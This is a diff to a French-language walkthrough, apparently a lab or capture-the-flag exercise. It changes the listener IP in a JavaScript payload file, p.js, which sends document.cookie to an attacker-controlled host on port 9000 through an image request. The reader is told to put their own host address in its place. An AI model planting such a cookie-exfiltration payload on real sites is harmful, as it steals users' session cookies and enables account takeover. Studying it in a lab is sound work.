@@ -187,11 +187,11 @@ Créer le fichier `p.js` qui exfiltre le cookie :
 
 ```bash
 cat > p.js <<'JS'
-new Image().src='http://10.20.204.87:9000/?c='+encodeURIComponent(document.cookie);
+new Image().src='http://192.168.0.109:9000/?c='+encodeURIComponent(document.cookie);
 JS
 ```
 
-Remplacer `10.20.204.87` par l'adresse IP de votre machine hôte.
+Remplacer `192.168.0.109` par l'adresse IP de votre machine hôte.
 
 ```bash
 ipconfig getifaddr en0
